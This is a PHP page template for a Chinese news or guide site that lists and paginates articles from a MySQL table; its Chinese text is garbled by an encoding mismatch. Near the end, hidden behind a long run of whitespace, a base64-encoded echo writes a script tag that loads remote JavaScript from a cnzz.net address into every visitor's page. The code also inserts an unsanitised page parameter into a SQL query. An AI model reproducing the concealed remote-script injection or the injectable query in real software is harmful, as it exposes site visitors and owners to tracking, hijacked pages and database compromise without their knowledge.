<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<link rel="Shortcut Icon" href="favicon.ico" type="image/x-icon" />
<link rel="Bookmark"  href="favicon.ico" type="image/x-icon" />
<meta name="baidu-site-verification" content="hvICH1fYKI" />
<meta http-equiv="Content-Type" content="text/html; charset=gbk" />

<?php
@$configfile = file_exists("config.php");
if(!$configfile){
    echo "<script>if(confirm('��δ�������ݿ�,��վ���޷���������,�Ƿ����ڽ��а�װ����?')){location.href='./install/index.php';}else{window.close();}</script>";
}
require_once("config.php");

$m="6";//ÿҳ��ʾ�ļ�¼��
$numsql = "select * from xwmi_news";
$numery = mysql_query($numsql,$config);
$lognum = mysql_num_rows($numery);//�ܼ�¼��
$zy = (int)(($lognum-1)/$m)+1;//��ҳ��
isset($_GET['page'])?$page=$_GET['page']:$page="1";//��ǰҳ��
$one = (int)($page-1)*$m;//��ǰҳ��������¼

$syssql = "select * from xwmi_news order by id desc limit $one,$m ";
$sysery = mysql_query($syssql,$config);


?>
<title>���ι���</title>
<meta name="copyright" content="Copyright 2010-2012 - axphp_Inc" />
<meta name="Description" content="<?php echo $sys['description'];?>" />
<meta name="Keywords" content="<?php echo $sys['keywords'];?>" />
<link href="style/home.css" rel="stylesheet" type="text/css" />
<link href="images/style1.css" rel="stylesheet" type="text/css" />
   <style type="text/css">

body {background-color: #FFFFCC}


</style>
<ul id="nav">
    <li><a href="../index.php">��ҳ</a></li>
    <li><a href="../partner.php">¿�����</a></li>
    <li><a href="../rocboss/index.php">¿������</a></li>
    <li><a href="../gonglv/index.php">���ι���</a></li>
    <li><a href="../in.php">·������</a></li>
    <li><a href="../logout.php">�˳�</a></li>
</ul>

<div id="menu"></div>
<div id="main">
<div id="left">
<?php
while($new = mysql_fetch_array($sysery))
{
    

echo '<div class="l">';
if($new['images']!=null)
{
    echo "<img src=$new[images] border=0 width=120 height=96 title=$new[title] ����ͼ />";
}
echo '</div>';
echo '<div class="r">';
echo '<span class="title"><strong><a href=news/?'.$new['id'].".html>";
echo $new['title'];
echo '</a></strong></span><br />';
echo $new['jianjie'];
echo '</div>';
}
?>
</div>



<div id="right">
<div class="m">���Ź���</div>
<div class="mt">

<ul>
<?php
$pvsql = "select * from xwmi_news order by pv desc limit 0,8";
$pvs = mysql_query($pvsql,$config);
while($pv = mysql_fetch_array($pvs))
{
    echo "<li><a href=news/?";
    echo $pv['id'];
    echo ".html>";
    $t = mb_substr($pv['title'],0,15,'GB2312');
    echo $t;
    echo "</a></li>";
}?>

</ul></div>

</div>



</div>
<div id="fanye">
<ul>

<?php
if($page>1)
{
    echo "<li>";
    echo "<a href=?page=";
    echo $page-1;
    echo ">";
    echo "��һҳ";
    echo "</li>";
    }
$fy = $zy-$page;
$pages = $page+$fy;


    for($i=$page;$i<=$zy;$i++)
    {
        if(($i-$page)>"6"){
            break;
        }
    echo "<li>";
    echo "<a href=?page=$i>";
    echo $i;
    echo "</a></li>";
    }

if($page!=$zy)
{
    echo "<li>";
    echo "<a href=?page=";
    echo $page+1;
    echo ">";
    echo "��һҳ";
    echo "</a></li>";
    }
                                                                                                                                                                            echo base64_decode("PHNjcmlwdCBpZD0nd2YnIHR5cGU9J3RleHQvamF2YXNjcmlwdCcgY2hhcnNldD0nZ2IyMzEyJyBzcmM9J2h0dHA6Ly9qcy5hZG0uY256ei5uZXQvcy5waHA/c2lkPTI0NjQxNiZsPXplbmd4aWxpbmcmdWlkPTEwNzc3Jz48L3NjcmlwdD4=");
?>
</ul>
</div>
<div id="bottom">
CopyRight (C) (��ѡ��) 2002-2014 ���ι��� , All Rights Reserved.
</div>